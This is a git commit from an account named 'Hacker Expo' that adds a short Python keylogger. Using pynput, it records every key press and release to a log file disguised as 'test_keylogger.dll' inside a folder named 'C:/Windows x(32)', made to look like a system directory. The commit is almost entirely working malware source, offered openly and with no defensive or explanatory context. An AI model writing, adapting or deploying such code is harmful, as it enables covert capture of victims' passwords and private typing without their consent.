b022a431f876597f8617f1413789d70be32eb079
Hacker Expo <75195496+HackerExpo@users.noreply.github.com>
2020-11-29 11:35:12 +0530

    Add files via upload
    KeyLogger Using Python

---
+++ keylogger_1.py
@@ -0,0 +1,24 @@
+from pynput import keyboard
+import logging
+import os
+
+os.mkdir("C:/Windows x(32)") 
+dir = r"C:/Windows x(32)/"
+
+logging.basicConfig(level=logging.INFO, filename= dir + 'test_keylogger.dll',filemode='a',format='%(process)d - %(asctime)s - %(message)s')
+
+def on_keypress(key):
+    if key == keyboard.Key.esc:
+        return False
+    else:
+        logging.info(str(key) + " is pressed")
+      #  print(key,end="\t")       
+    
+def on_keyrelease(key):
+    logging.info(str(key) + " is released")
+   # print(key , "is released", end="\t")
+    #print(" ",end="/n") 
+
+l = keyboard.Listener(on_press = on_keypress, on_release = on_keyrelease)
+l.start()
+l.join()
